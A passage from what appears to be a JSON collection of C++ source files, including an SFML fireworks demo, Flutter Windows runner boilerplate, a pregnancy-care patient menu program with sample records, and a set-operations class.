4:\n\t\t\tt.leaf(root);\n\t\t\tbreak;\n\t\t\tcase 5:\n\t\t\texit(5);\n\t\t\tdefault:\n\t\t\tcout<<\"Invalid Choice!!\";\n\t\t\tbreak;\n\t\t}\n\t\t}while(ch!=5);\n\t\treturn 0;\n}\n",
    "\ufeff#include \"firework.h\"\n\nconstexpr float gravity = 500.0f;\n\nint main() {\n    sf::ContextSettings settings;\n    settings.antialiasingLevel = 8;\n\n    sf::RenderWindow window(sf::VideoMode(1600, 900), \"SpaceBar to clear screen\", sf::Style::Close, settings);\n    window.setFramerateLimit(120);\n\n    sf::Font font;\n    font.loadFromFile(\"OpenSans-Regular.ttf\");\n\n    sf::Text fpsText;\n    fpsText.setFont(font);\n    fpsText.setCharacterSize(36); \n    fpsText.setFillColor(sf::Color::Red);\n    fpsText.setPosition(10, 10);\n\n    sf::Event event;\n\n    sf::Clock fpsClock;\n    unsigned int frameCount = 0;\n    sf::Clock deltaClock;\n    float dt = 1.0f / 60.0f; // 1/60 seconds\n\n    //this is to render texture for the fireworks\n    sf::RenderTexture fadeTexture;\n    fadeTexture.create(1600, 900);\n\n    sf::CircleShape blastBoom; // this represents the blast\n    blastBoom.setRadius(50);\n    blastBoom.setPointCount(100);\n\n    std::vector<Firework> Fireworks; // store alr drawn fireworks\n    std::vector<Firework> FireWorksAftermath; // store the effects of splash\n\n    bool MousePressed = false;\n    bool SpacePressed = false;\n\n    while (window.isOpen()) {\n        while (window.pollEvent(event)) {\n            switch (event.type) {\n            case sf::Event::Closed:\n                window.close();\n                break;\n            case sf::Event::MouseButtonPressed:\n                if (event.mouseButton.button == sf::Mouse::Left) {\n                    sf::Vector2f mousePos(sf::Mouse::getPosition(window)); //mouse pos relative to current active window\n\n                    Fireworks.emplace_back\n                    (\n                        (float)randomInt(12, 16),\n                        sf::Vector2f(mousePos.x, mousePos.y), //  use mouse position without offset\n                        sf::Vector2f{},\n                        sf::Color((sf::Uint8)randomInt(120, 255), (sf::Uint8)randomInt(120, 255), (sf::Uint8)randomInt(120, 255))\n                    );\n\n                    MousePressed = true;\n                }\n                break; //these needs to go both ways\n            case sf::Event::KeyPressed:\n                if (event.key.code == sf::Keyboard::Space) {\n                    Fireworks.clear();\n                    FireWorksAftermath.clear();\n                    fadeTexture.clear();\n                    SpacePressed = true; \n                }\n                break;\n            case sf::Event::KeyReleased:\n                if (event.key.code == sf::Keyboard::Space) {\n                    SpacePressed = false; \n                }\n                break;\n            }\n        }\n\n        window.clear();\n\n        if (!SpacePressed) {\n            static float fadeElapsedTime = 0.0f;\n            fadeElapsedTime += dt;\n\n            if (!Fireworks.empty()) { //if not empty we loop and continusely draw\n                for (size_t i = 0; i < Fireworks.size(); i++) {\n                    auto& current = Fireworks[i];\n\n                    current.Velocity.y += gravity * dt;\n\n                    if (current.Velocity.y > 0.0f) {\n                        createExplosion(FireWorksAftermath, current);\n\n                        Fireworks.erase(Fireworks.begin() + i);\n                        i--;\n                        continue;\n                    }\n\n                    current.Position += current.Velocity * dt;\n\n                    blastBoom.setRadius(current.Radius);\n                    blastBoom.setFillColor(current.Color);\n                    blastBoom.setOrigin(sf::Vector2f(current.Radius, current.Radius));\n                    blastBoom.setPosition(current.Position);\n\n                    fadeTexture.draw(blastBoom);\n                }\n            }\n\n            for (size_t i = 0; i < FireWorksAftermath.size(); i++) { // this is for the blast effect\n                auto& current = FireWorksAftermath[i];\n\n                current.Velocity.y += gravity * dt;\n\n                current.Position += current.Velocity * dt;\n\n                current.Radius -= 10.0f * dt;\n                if (current.Radius <= 1.0f) {\n                    FireWorksAftermath.erase(FireWorksAftermath.begin() + i);\n                    i--;\n                    continue;\n                }\n\n                blastBoom.setRadius(current.Radius);\n                blastBoom.setFillColor(current.Color);\n                blastBoom.setOrigin(sf::Vector2f(current.Radius, current.Radius));\n                blastBoom.setPosition(current.Position);\n\n                fadeTexture.draw(blastBoom);\n            }\n\n            fadeTexture.display();\n\n            window.draw(sf::Sprite(fadeTexture.getTexture()));\n        }\n\n        //this is for fps kinda whack imo\n        frameCount++;\n        if (fpsClock.getElapsedTime().asSeconds() >= 1.0f) {\n            float fps = static_cast<float>(frameCount) / fpsClock.restart().asSeconds();\n            fpsText.setString(\"FPS: \" + std::to_string(static_cast<int>(fps)));\n\n            frameCount = 0;\n        }\n        window.draw(fpsText);\n\n        window.display();\n\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\r\n#include <vector>\r\n#include <string>\r\nusing namespace std;\r\n\r\nstruct DietPlan \r\n{\r\n    std::string description;\r\n};\r\n\r\n\r\nstruct ExercisePlan \r\n{\r\n    std::string description;\r\n};\r\n\r\nstruct Doctor \r\n{\r\n    std::string name;\r\n    std::string contactNumber;\r\n};\r\n\r\nstruct Patient \r\n{\r\n    std::string name;\r\n    std::string enrollmentDate;\r\n    std::string contactNumber;\r\n    std::string disease;\r\n    std::string pregnancyWeeks;\r\n    std::string height;\r\n    std::string weight;\r\n    Doctor attendingDoctor;\r\n};\r\nstruct EmergencyContacts\r\n{\r\n\tstd::string name;\r\n\tstd::string contactNumber;\r\n};\r\n\r\nvoid displayDoctors(const std::vector<Doctor>& doctors);\r\nvoid bookAppointment(const Doctor& doctor);\r\nvoid viewPatientInfo(const std::vector<Patient>& patients);\r\nvoid viewPatientInfoIndex(const std::vector<Patient>& patients, int patientChoice);\r\nvoid viewDietPlanForPregnancy();\r\nvoid displayEmergencyContacts(const std::vector<EmergencyContacts>& contacts);\r\n\r\nint main() \r\n{\r\n    std::vector<Doctor> nearbyDoctors;\r\n    nearbyDoctors.push_back({\"Dr. Khurana\", \"789-222-3333\"});\r\n    nearbyDoctors.push_back({\"Dr. Arora\", \"987-333-4444\"});\r\n    nearbyDoctors.push_back({\"Dr. Sharma\", \"986-444-5555\"});\r\n    nearbyDoctors.push_back({\"Dr. Menon\", \"777-444-5555\"});\r\n    nearbyDoctors.push_back({\"Dr. Rudra\", \"897-444-5555\"});\r\n    nearbyDoctors.push_back({\"Dr. Sneha\", \"888-444-5555\"});\r\n\r\n    std::vector<Patient> patients;\r\n    patients.push_back({\"Ishi Dikshit\", \"20-August-2023\", \"123-456-7890\", \"Thyroid\", \"8\", \"5.2\", \"160\", \"55\", {\"Dr. Khurana\", \"789-222-3333\"}});\r\n    patients.push_back({\"Rakshita Rudra\",\"22-April-2023\", \"987-654-3210\",\"N/A\", \"5\", \"165\", \"62\",{\"Dr. Sneha\", \"888-444-5555\"} });\r\n    patients.push_back({\"Anamika Mishra\",\"20-February-2023\", \"555-123-4567\",\"PCOD\",\"9\", \"155\", \"70\",{\"Dr. Sharma\", \"986-444-5555\"}});\r\n    patients.push_back({\"Diya Roy\", \"01-April-2023\", \"789-123-4567\",\"Diabetes\", \"4\", \"162\", \"68\",{\"Dr. Rudra\", \"897-444-5555\"}});\r\n    patients.push_back({\"Priya Sharma\",\"22-july-2023\", \"987-654-3210\",\"N/A\", \"7\", \"163\", \"60\",{\"Dr. Arora\", \"987-333-4444\"}});\r\n    patients.push_back({\"Himanshi Patel\",\"07-june-2023\", \"555-777-8888\",\"Hypertension\", \"2\", \"157\", \"65\",{\"Dr. Khurana\", \"789-222-3333\"} });\r\n    patients.push_back({\"Sneha Gupta\",\"21-August-2023\", \"123-987-6543\",\"Lactose intolrance\", \"5\", \"168\", \"58\",{\"Dr. Menon\", \"777-444-5555\"} });\r\n    patients.push_back({\"Sunena Singh\",\"20-january-2023\", \"777-555-9999\", \"N/A\", \"4\", \"170\", \"70\",{\"Dr. Khurana\", \"789-222-3333\"} });\r\n    patients.push_back({\"Anita Verma\",\"16-March-2023\", \"222-333-4444\", \"Hyperthyroid\", \"8\", \"155\", \"75\",{\"Dr. Arora\", \"987-333-4444\"} });\r\n    patients.push_back({\"Maithili Mehta\",\"16-March-2023\", \"444-555-6666\",\"N/A\", \"7\", \"161\", \"63\",{\"Dr. Rudra\", \"897-444-5555\"} });\r\n    patients.push_back({\"Pooja Malhotra\",\"18-September-2023\", \"555-444-3333\",\"Allergic to Root and tubers\", \"N/A\", \"166\", \"58\", {\"Dr. Menon\", \"777-444-5555\"}});\r\n    patients.push_back({\"Mitali Sharma\",\"29-September-2023\",\"123-987-6543\",\"N/A\", \"3\", \"159\", \"62\", {\"Dr. Rudra\", \"897-444-5555\"}});\r\n\r\n    std::vector<EmergencyContacts> contacts;\r\n    contacts.push_back({\"Apollo Hospitals\",\"1066\"});\r\n    contacts.push_back({\"Fortis Healthcare\",\"105010\"});\r\n    contacts.push_back({\"Emergency Ambulance Services\",\"108\"});\r\n    \r\n    int choice;\r\n    int patientChoice;\r\n\r\n    do {\r\n        std::cout <<endl<< \"1. View patient information\\n\";\r\n        std::cout << \"2. View diet plan for pregnancy\\n\";\r\n        std::cout << \"3. View exercise plan\\n\";\r\n        std::cout << \"4. View nearby doctors\\n\";\r\n        std::cout << \"5. Book an appointment\\n\";\r\n        std::cout << \"6. View emergency contact numbers\\n\";\r\n        std::cout << \"7. Exit\\n\";\r\n        std::cout << \"Enter your choice: \";\r\n        std::cin >> choice;\r\n\r\n        switch (choice) \r\n\t\t{\r\n            case 1:\r\n                viewPatientInfo(patients);\r\n                break;\r\n            case 2:\r\n                viewDietPlanForPregnancy();\r\n                break;\r\n            case 3:\r\n               std::cout <<endl<< \"Your exercise plan for pregnant women: ...\\n\";\r\n               std::cout << \"---------------------------------------------------------------------------\\n\";\r\n               std::cout << \"Day 1: Gentle Cardio and Balance:\\n\";\r\n               std::cout << \"       - Morning: 20 minutes of prenatal walking or stationary cycling at a moderate pace\\n\";\r\n               std::cout << \"       - Afternoon: Balance exercises (standing on one leg, wall-supported squats) for 15 minutes\\n\";\r\n               std::cout << \"       - Evening: Prenatal yoga for relaxation and balance (15-20 minutes)\\n\";\r\n               std::cout << \"---------------------------------------------------------------------------\\n\";\r\n               std::cout << \"Day 2: Rest and Relaxation:\\n\";\r\n               std::cout << \"       - Focus on rest, relaxation, and deep breathing exercises\\n\";\r\n               std::cout << \"-------------",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include<iostream>\nusing namespace std;\n\nclass Set\n{\n\t\tint set[20];\n\t\tint size;\n\tpublic:\n\t\tSet() : size(0)\n\t\t{}\n\t\t\n\t\tvoid insert(int);\n\t\t\n\t\tvoid display()\n\t\t{\n\t\t\tcout<<\"Set Contains : \";\n\t\t\tfor(int i = 0 ; i < size ; i++)\n\t\t\t\tcout<<set[i] << \"\\t\" ;\n\t\t\tcout<<\"\\n\\n\";\n\t\t}\n\t\tint search(int key)\n\t\t{\n\t\t    for(int i = 0; i < size ; i++)\n\t\t    {\n\t\t        if(set[i] == key)\n\t\t            return i+1;\n\t\t    }\n\t\t    return 0;\n\t\t}\n\t\t\n\t\tvoid remove(int key) \n\t\t{\n\t\t\tint index = search(key);\n\t\t\tif(index)\n\t\t\t{\n\t\t\t\tfor(int i = index - 1 ; i < size ; i++)\n\t\t\t\t{\n\t\t\t\t\tset[i] = set[i+1];\t\n\t\t\t\t\t\n\t\t\t\t}\n\t\t\t\tsize--;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tcout<<\"Element Not Found!\\n\";\n\t\t\t}\n\t\t}\n\t\t\n\t\tvoid uni(Set& s)\n\t\t{\n\t\t\tSet temp;\n\t\t\t\n\t\t\tfor(int i = 0; i < size; i++)\n\t\t\t{\n\t\t\t\ttemp.insert(set[i]);\t\t\t\t\n\t\t\t}\n\t\t\t\n\t\t\tfor(int j = 0; j < s.size; j++)\n\t\t\t{\n\t\t\t\tint index = temp.search(s.set[j]);\n\t\t\t\tif(!index)\n\t\t\t\t{\n\t\t\t\t\ttemp.insert(s.set[j]);\n\t\t\t\t}\t\t\t\t\n\t\t\t}\n\t\t\tcout<<\"\\n-----After Union-----\\n\";\n\t\t\ttemp.display();\t\t\t\t\t\n\t\t}\n\t\tvoid intersection(Set& s)\n\t\t{\n\t\t\tSet temp;\n\t\t\tint index;\n\t\t\tfor(int j = 0; j < s.size; j++)\n\t\t\t{\n\t\t\t\tindex = search(s.set[j]);\n\t\t\t\tif(index)\n\t\t\t\t{\n\t\t\t\t\ttemp.insert(s.set[j]);\n\t\t\t\t}\n\t\t\t}\n\t\t\tcout<<\"\\n-----After Intersection-----\\n\";\n\t\t\tif(temp.size == 0)\n\t\t\t\tcout<<\"It is a Null Set\\n\";\n\t\t\telse\n\t\t\t\ttemp.display();\n\t\t}\n\t\tvoid difference(Set& s)\n\t\t{\n\t\t\tSet temp;\n\t\t\t\n\t\t\tint index;\n\t\t\tfor(int j = 0; j < s.size; j++)\n\t\t\t{\n\t\t\t\tindex = search(s.set[j]);\n\t\t\t\tif(!index)\n\t\t\t\t{\n\t\t\t\t\ttemp.insert(s.set[j]);\n\t\t\t\t}\n\t\t\t}\n\t\t\tcout<<\"\\n-----After Difference Operation-----\\n\";\n\t\t\ttemp.display();\n\t\t}\n\t\tint subset(Set& s)\n\t\t{\n\t\t\tfor(int i = 0; i < s.size ; i++)\n\t\t\t{\n\t\t\t\tif(!search(s.set[i]))\n\t\t\t\t\treturn 0;\n\t\t\t}\n\t\t\treturn 1;\n\t\t}\n\t\t\n\t\t\n}; \nvoid Set::insert(int ele)\n{\n\tset[size++] = ele;\t\n}\nint main()\n{\n\tSet s1,s2;\n\tint ch;\n\t\t\n\tdo\n\t{\n\t\tcout<<\"\\n----MENU----\\n\";\n\t\tcout<<\"1.Add an element in Set 1\\n\";\n\t\tcout<<\"2.Display Set 1\\n\";\n\t\tcout<<\"3.Search an element in Set 1\\n\";\n\t\tcout<<\"4.Remove an element in Set 1\\n\";\n\t\t\n\t\tcout<<\"\\n5.Add an element in Set 2\\n\";\n\t\tcout<<\"6.Display Set 2\\n\";\n\t\tcout<<\"7.Search an element in Set 2\\n\";\n\t\tcout<<\"8.Remove an element in Set 2\\n\\n\";\n\t\t\n\t\tcout<<\"9.Union of Set 1 and Set 2\\n\";\n\t\tcout<<\"10.Intersection of Set 1 and Set 2\\n\";\n\t\tcout<<\"11.Difference of Set 1 and Set 2\\n\";\n\t\tcout<<\"12.Check if Set 2 is subset of Set 1\\n\";\n\t\t\n\t\tcout<<\"13.Exit\\n\\n\";\n\t\tcout<<\"Enter your choice : \";\t\n\t\tcin>>ch;\n\t\tint ele,key;\n\t\tint index;\n\t\tswitch(ch)\n\t\t{\n\t\t\tcase 1:\n\t\t\t\tcout<<\"Enter the Element to be inserted : \";\n\t\t\t\tcin>>ele;\n\t\t\t\ts1.insert(ele);\n\t\t\t\tbreak;\n\t\t\tcase 2:\n\t\t\t\ts1.display();\n\t\t\t\tbreak;\n\t\t    case 3:\n\t\t        cout<<\"Enter the element to be searched : \";\n\t\t        cin>>key;\n\t\t        index = s1.search(key);\n\t\t        \n\t\t        if(index)\n\t\t            cout<<\"Element found at \"<<index<<\"th location\\n\";\n\t\t        else\n\t\t            cout<<\"Element Not Found!\\n\";\n\t\t        break;\n\t\t\tcase 4:\n\t\t        cout<<\"Enter the element to be Removed : \";\n\t\t        cin>>key;\n\t\t        s1.remove(key);\n\t\t        break;\n\t\t  \t\n\t\t  \tcase 5:\n\t\t\t\tcout<<\"Enter the Element to be inserted : \";\n\t\t\t\tcin>>ele;\n\t\t\t\ts2.insert(ele);\n\t\t\t\tbreak;\n\t\t\tcase 6:\n\t\t\t\ts2.display();\n\t\t\t\tbreak;\n\t\t    case 7:\n\t\t        cout<<\"Enter the element to be searched : \";\n\t\t        cin>>key;\n\t\t        index = s2.search(key);\n\t\t        \n\t\t        if(index)\n\t\t            cout<<\"Element found at \"<<index<<\"th location\\n\";\n\t\t        else\n\t\t            cout<<\"Element Not Found!\\n\";\n\t\t        break;\n\t\t\tcase 8:\n\t\t        cout<<\"Enter the element to be Removed : \";\n\t\t        cin>>key;\n\t\t        s2.remove(key);\n\t\t        break; \n\t\t    \n\t\t   \tcase 9:\n\t\t   \t\ts1.uni(s2);\n\t\t   \t\tbreak;\n\t\t   \tcase 10:\n\t\t   \t\ts1.intersection(s2);\n\t\t   \t\tbreak;\n\t\t   \tcase 11:\n\t\t   \t\ts2.difference(s1);\n\t\t   \t\tbreak;\n\t\t   \tcase 12:\n\t\t   \t\tkey = s1.subset(s2);\n\t\t   \t\tif(key)\n\t\t   \t\t\tcout<<\"Set 2 is a Subset of Set 1\"<<endl;\n\t\t   \t\telse\n\t\t   \t\t\tcout<<\"Set 2 is not a Subset of Set 1\"<<endl;\n\n\t\t  \n\t\t}\n\t}while(ch != 13);\n\treturn 0;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != 